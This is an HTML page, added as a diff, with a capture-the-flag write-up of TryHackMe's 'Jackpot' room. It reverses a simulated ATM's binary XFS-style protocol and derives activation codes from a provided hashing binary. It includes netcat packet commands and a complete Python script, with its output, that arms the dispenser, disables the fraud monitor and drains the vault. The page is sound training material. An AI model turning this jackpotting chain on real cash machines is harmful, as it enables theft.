@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jackpot: reverse-engineering a binary ATM protocol</title>
+  <meta name="description" content="A walkthrough of the TryHackMe Jackpot room: mapping a custom binary XFS protocol over raw TCP, reversing an activation-code binary, and chaining it all into one persistent socket to drain the vault.">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
+  <h1>Jackpot: reverse-engineering a binary ATM protocol</h1>
+  <p class="dek">A simulated ATM listens on port 9100 and speaks a custom binary protocol modeled on the real-world XFS standard. No card, no PIN, just raw TCP packets. Here's how I mapped the protocol, reversed the activation-code binary, and chained it into one persistent socket to drain the vault.</p>
+
+  <div class="meta-row">
+    <span class="pill">Room: Jackpot</span>
+    <span class="pill">Category: Binary / Network Protocol</span>
+    <span class="pill">Tools: netcat, objdump, python3</span>
+  </div>
+
+  <div class="brief">
+    <p><strong>The setup:</strong> the ATM's engineering interface is reachable over raw TCP, no card, no PIN. The job: reverse the binary framing protocol, derive a valid activation code from a binary the challenge provides, and chain enough commands together in one connection to drain the vault and reach a hidden flag command.</p>
+    <p>Best part: the service documents its own protocol if you just ask it to.</p>
+  </div>
+
+  <section>
+    <h2 class="section-title">Background, In Plain Terms</h2>
+    <div class="skills">
+      <div class="skill">
+        <div class="skill-title">XFS</div>
+        <p>eXtensions for Financial Services, the real Windows API ATM software uses to talk to hardware (card readers, dispensers). Every command has a numeric ID and falls into two families: GETINFO (read state) and EXECUTE (do something). This challenge emulates that structure over a raw socket.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">Binary framing</div>
+        <p>Most web APIs send plain text. This service sends raw bytes: a fixed header telling you how many bytes of payload follow, then the payload. You build and parse those byte sequences by hand instead of just reading JSON off the wire.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">The Investigation</h2>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Let the service describe itself</div>
+          <p>Connecting with netcat alone was enough to learn the protocol. The service sends a self-describing banner on every new connection:</p>
+          <pre><code>nc 10.144.130.165 9100 | xxd</code></pre>
+          <pre><code>{<span class="ca">"service"</span>: <span class="ca">"Branch Engineering Gateway"</span>, <span class="ca">"protocol"</span>: <span class="ca">"XFS bridge"</span>,
+ <span class="ca">"request_format"</span>: <span class="ca">"1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + &lt;length&gt; bytes of data"</span>,
+ <span class="ca">"reply_format"</span>: <span class="ca">"2 byte big-endian length + &lt;length&gt; bytes of JSON"</span>,
+ <span class="ca">"msg_types"</span>: {<span class="ca">"GETINFO"</span>: <span class="ca">"0x01"</span>, <span class="ca">"EXECUTE"</span>: <span class="ca">"0x02"</span>},
+ <span class="ca">"hint"</span>: <span class="ca">"query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"</span>}</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A service that documents its own request format and hands you the next query to run has effectively given away its attack surface. Always try the simplest possible interaction first, here, just connecting, before reaching for a disassembler.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Pull the full command table</div>
+          <p>Following the hint, a GETINFO for command <code>0x0304</code>. The packet is just the header format from the banner, built by hand:</p>
+          <pre><code><span class="cm">\x01              </span>msg_type = GETINFO
+<span class="cm">\x00\x00\x03\x04  </span>command id 0x0304, big-endian
+<span class="cm">\x00\x00          </span>data length = 0 (no payload)
+
+<span class="cm">$ </span>printf <span class="ca">'\x01\x00\x00\x03\x04\x00\x00'</span> | nc 10.144.130.165 9100 | strings</code></pre>
+          <p>That returned the full command table: a status query, cash unit info, a <code>DISPENSE</code> command, an <code>ARM</code> command that clearly needs authentication, a fraud <code>SET_MONITOR</code> command, a hidden <code>GET_FLAG</code> command, and a 40-note cap per dispense call.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Reading a binary protocol's own introspection endpoint (if it has one) beats guessing command IDs by brute force. It also tells you the shape of the exploit before you've written a line of exploit code: arm, then dispense, then flag.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Reverse the activation-code binary</div>
+          <p>A stripped 64-bit ELF named <code>jackpot</code> ships with the challenge. Disassembly shows it takes a 6-digit session nonce as its argument, runs FNV-1a (a fast non-cryptographic hash) over the nonce plus a hardcoded salt, then prints <code>hash % 100000000</code> as an 8-digit activation code.</p>
+          <pre><code><span class="cm">$ </span>./jackpot <span class="ca">123456</span>
+[*] session nonce : 123456
+[*] activation code: 47384178</code></pre>
+          <p>The nonce has to come from the ATM itself, per connection. Guessing it produces an "invalid activation code" error.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A deterministic hash is not authentication if the attacker can run the same hash function. Once the binary is reversed, the "activation code" is just a calculator, not a secret.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Notice the state resets per connection</div>
+          <p>Each new <code>nc</code> invocation opens a fresh TCP connection, and the ATM hands out a new session nonce every time. The armed state and the fraud-monitor state are scoped to the connection too. Sending ARM on one connection and DISPENSE on the next just resets everything and locks with a "null transaction id" error.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Per-connection state is a common pattern for interfaces that assume a slower, human-paced session. An attacker who understands the lifecycle just does everything inside one persistent socket instead of several manual netcat calls.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <div class="step-title">Chain it into one script</div>
+          <p>One socket, one session: read the status for the nonce, feed it to the <code>jackpot</code> binary for the activation code, arm the dispenser, kill the fraud monitor, dispense in batches of 40 until the vault is empty, then call the flag command.</p>
+          <pre><code><span class="cm">#!/usr/bin/python</span>
+<span class="ca">import</span> socket, struct, json, subprocess
+
+HOST, PORT = <span class="ca">'10.144.130.165'</span>, <span class="ca">9100</span>
+
+<span class="ca">def</span> read_frame(s):
+    length_bytes = b<span class="ca">''</span>
+    <span class="ca">while</span> len(length_bytes) &lt; 2:
+        length_bytes += s.recv(2 - len(length_bytes))
+    length = struct.unpack(<span class="ca">'>H'</span>, length_bytes)[0]
+    data = b<span class="ca">''</span>
+    <span class="ca">while</span> len(data) &lt; length:
+        data += s.recv(length - len(data))
+    <span class="ca">return</span> json.loads(data)
+
+<span class="ca">def</span> send_cmd(s, msg_type, cmd_id, data=b<span class="ca">''</span>):
+    pkt = bytes([msg_type]) + struct.pack(<span class="ca">'>I'</span>, cmd_id) + struct.pack(<span class="ca">'>H'</span>, len(data)) + data
+    s.sendall(pkt)
+    <span class="ca">return</span> read_frame(s)
+
+s = socket.socket()
+s.connect((HOST, PORT))
+banner = read_frame(s)
+
+status = send_cmd(s, 0x01, 0x0301)
+nonce = status[<span class="ca">'status'</span>][<span class="ca">'nonce'</span>]
+remaining = status[<span class="ca">'status'</span>][<span class="ca">'remaining_notes'</span>]
+
+result = subprocess.run([<span class="ca">'./jackpot'</span>, nonce], capture_output=<span class="ca">True</span>, text=<span class="ca">True</span>)
+activation_code = <span class="ca">None</span>
+<span class="ca">for</span> line <span class="ca">in</span> result.stdout.splitlines():
+    <span class="ca">if</span> <span class="ca">'activation code'</span> <span class="ca">in</span> line:
+        activation_code = line.split(<span class="ca">':'</span>)[-1].strip()
+
+arm = send_cmd(s, 0x02, 0x04f0, activation_code.encode())
+monitor = send_cmd(s, 0x02, 0x04f1, b<span class="ca">'off'</span>)
+
+<span class="ca">for</span> i <span class="ca">in</span> range(remaining // 40):
+    send_cmd(s, 0x02, 0x0401, b<span class="ca">'40'</span>)
+
+flag = send_cmd(s, 0x02, 0x04ff)
+s.close()</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>The exploit is really just a translation of the protocol spec and the command table from steps 1 and 2 into code, plus the activation code from step 3. Nothing here is a novel trick, it's the same manual packet you'd send with <code>printf | nc</code>, just automated and kept on one socket.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Run it and close the loop</div>
+          <pre><code><span class="cm">$ </span>python3 exploit.py
+[*] ARM: {<span class="ca">'rc'</span>: <span class="ca">'WFS_SUCCESS'</span>, <span class="ca">'detail'</span>: <span class="ca">'armed - supervisor mode'</span>}
+[*] SET_MONITOR: {<span class="ca">'rc'</span>: <span class="ca">'WFS_SUCCESS'</span>, <span class="ca">'monitor_on'</span>: <span class="ca">False</span>}
+[*] DISPENSE: notes=40 each call, remaining counts down to 0
+[*] FLAG: {<span class="ca">'rc'</span>: <span class="ca">'WFS_SUCCESS'</span>, <span class="ca">'flag'</span>: <span class="redacted">[redacted]</span>}</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>The flag command only returns successfully once the vault balance actually reaches zero. It's a server-side check, not a client-side reveal, so the whole chain (nonce, activation code, arm, monitor, dispense) has to be correct and in order before it pays out.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Full Attack Chain</h2>
+    <pre><code>nc port 9100
+  &rarr; banner: protocol spec + hint
+       &rarr; GETINFO 0x304: full command table
+            &rarr; GET_FLAG exists at 0x4ff (needs vault empty)
+            &rarr; ARM at 0x4f0 (needs activation code)
+       &rarr; GETINFO 0x301: session nonce per connection
+            &rarr; ./jackpot &lt;nonce&gt;: FNV-1a hash &rarr; activation code
+                 &rarr; EXECUTE ARM with code: supervisor mode
+                      &rarr; EXECUTE SET_MONITOR off: fraud lock disabled
+                           &rarr; EXECUTE DISPENSE in batches: vault = 0
+                                &rarr; EXECUTE GET_FLAG</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Tools Used</h2>
+    <div class="ref-wrap">
+      <table class="ref">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>netcat</td><td>Initial protocol exploration and manual packet sending</td></tr>
+        <tr><td>objdump / gdb</td><td>Disassembly of the stripped jackpot ELF to identify FNV-1a</td></tr>
+        <tr><td>jackpot (provided)</td><td>Derives the activation code from a session nonce via FNV-1a</td></tr>
+        <tr><td>python3 (socket, struct)</td><td>Persistent TCP session with binary framing for the full exploit chain</td></tr>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Takeaways</h2>
+    <div class="skills">
+      <div class="skill">
+        <div class="skill-title">Self-describing protocols help attackers too</div>
+        <p>The ATM banner documented its own command set, packet format, and even hinted at the first query to run. Engineering interfaces like this should never be reachable from untrusted networks, and definitely shouldn't advertise their own attack surface.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">Per-connection state needs defending explicitly</div>
+        <p>The fraud monitor and the armed state both reset on every new connection. Understanding that session lifecycle is what let the whole chain run inside one socket, bypassing controls that assumed a slower, human-paced interaction.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">A deterministic hash is not authentication</div>
+        <p>The session nonce was readable in plaintext from the same socket. Feeding it into a hash function to produce an "activation code" gives no real security: anyone with the binary can compute the code. Real authentication requires a secret the attacker doesn't have.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer>tryhackme.com &middot; solved via protocol reverse-engineering and binary analysis</footer>
+
+</div>
+</body>
+</html>
